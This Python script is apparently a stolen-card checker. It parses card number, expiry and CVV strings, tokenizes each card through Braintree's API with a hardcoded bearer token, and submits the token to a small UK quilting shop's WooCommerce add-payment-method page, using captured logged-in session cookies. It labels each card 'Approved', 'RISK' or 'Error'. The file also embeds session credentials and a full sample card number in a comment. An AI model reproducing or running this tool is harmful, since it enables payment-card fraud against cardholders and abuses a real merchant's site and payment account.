def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	



	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk4NDIyOTksImp0aSI6ImZiNDI1OGZkLWU3ZmUtNDY0ZC1iN2YyLTNkNjRmMmZjZDlmZCIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.vkVjhJRFq1aL5e2smS3sJT3efvkVGRMx7BYWiURm09WN27mGV-8s21RNEDgaMb_oMYK_Kk30hghE3_xZi5DwAg',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '6f7eafc5-8d2e-4300-82c9-bc221575d9bb',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"6f7eafc5-8d2e-4300-82c9-bc221575d9bb"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5234651575032351","expirationMonth":"05","expirationYear":"2027","cvv":"338"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)



	tok = response.json()['data']['tokenizeCreditCard']['token']






	cookies = {
    'tk_or': '%22%22',
    'tk_lr': '%22%22',
    'eucookielaw': '1733881702857',
    '_ga': 'GA1.1.437061321.1718329728',
    'tk_ai': 'RjLtSnPN9HdMiS3Ezh2Kw%2BY9',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-30%2013%3A54%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fshop%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2024-06-30%2013%3A54%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fshop%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'tk_r3d': '%22%22',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '59dc8b8d7c5a94ae502eb7b88b1e4c6d',
    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'fndndnn.fnfndndndn-6824%7C1720965444%7CMGtdM0bGqLOQW4jattCI8kcwh96a0ZCsksCxBmFwK22%7C679cf9c446dd83c304b10cf34f91fa9cba0472b04605a8764f07a5f089a14f98',
    'wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29': '201%7C%7C1719928532%7C%7C1719924932%7C%7Cd19e03744823400348e7b05d904ada11',
    'tk_ai': 'jetpack%3ANnm5ZzQ%2BwHvE4iNkNUtx%2BWc1',
    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '201%7Cother%7Cread%7C652de3517d55753f2e51274c4bd9337b1da198f34d219608eee637e472584acd',
    '_ga_EX1GV7CW1V': 'GS1.1.1719755711.3.1.1719755851.0.0.0',
    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'tk_qs': '',
    '_ga_347410393': 'GS1.1.1719755711.6.1.1719755898.0.0.0',
}

	headers = {
    'authority': 'www.carolyngibbsquilts.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'tk_or=%22%22; tk_lr=%22%22; eucookielaw=1733881702857; _ga=GA1.1.437061321.1718329728; tk_ai=RjLtSnPN9HdMiS3Ezh2Kw%2BY9; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-30%2013%3A54%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fshop%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-06-30%2013%3A54%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fshop%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; tk_r3d=%22%22; wordpress_test_cookie=WP%20Cookie%20check; woocommerce_items_in_cart=1; woocommerce_cart_hash=59dc8b8d7c5a94ae502eb7b88b1e4c6d; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=fndndnn.fnfndndndn-6824%7C1720965444%7CMGtdM0bGqLOQW4jattCI8kcwh96a0ZCsksCxBmFwK22%7C679cf9c446dd83c304b10cf34f91fa9cba0472b04605a8764f07a5f089a14f98; wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29=201%7C%7C1719928532%7C%7C1719924932%7C%7Cd19e03744823400348e7b05d904ada11; tk_ai=jetpack%3ANnm5ZzQ%2BwHvE4iNkNUtx%2BWc1; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=201%7Cother%7Cread%7C652de3517d55753f2e51274c4bd9337b1da198f34d219608eee637e472584acd; _ga_EX1GV7CW1V=GS1.1.1719755711.3.1.1719755851.0.0.0; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F;
    'origin': 'https://www.carolyngibbsquilts.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"9b3dceb9dfdac9eaabbba23e10da119b"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '5.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '5.00'),
    ('wc_braintree_credit_card_payment_nonce',tok,),
    ('wc_braintree_device_data', '{"correlation_id":"9b3dceb9dfdac9eaabbba23e10da119b"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', '3550d0cf6a'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post(
    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
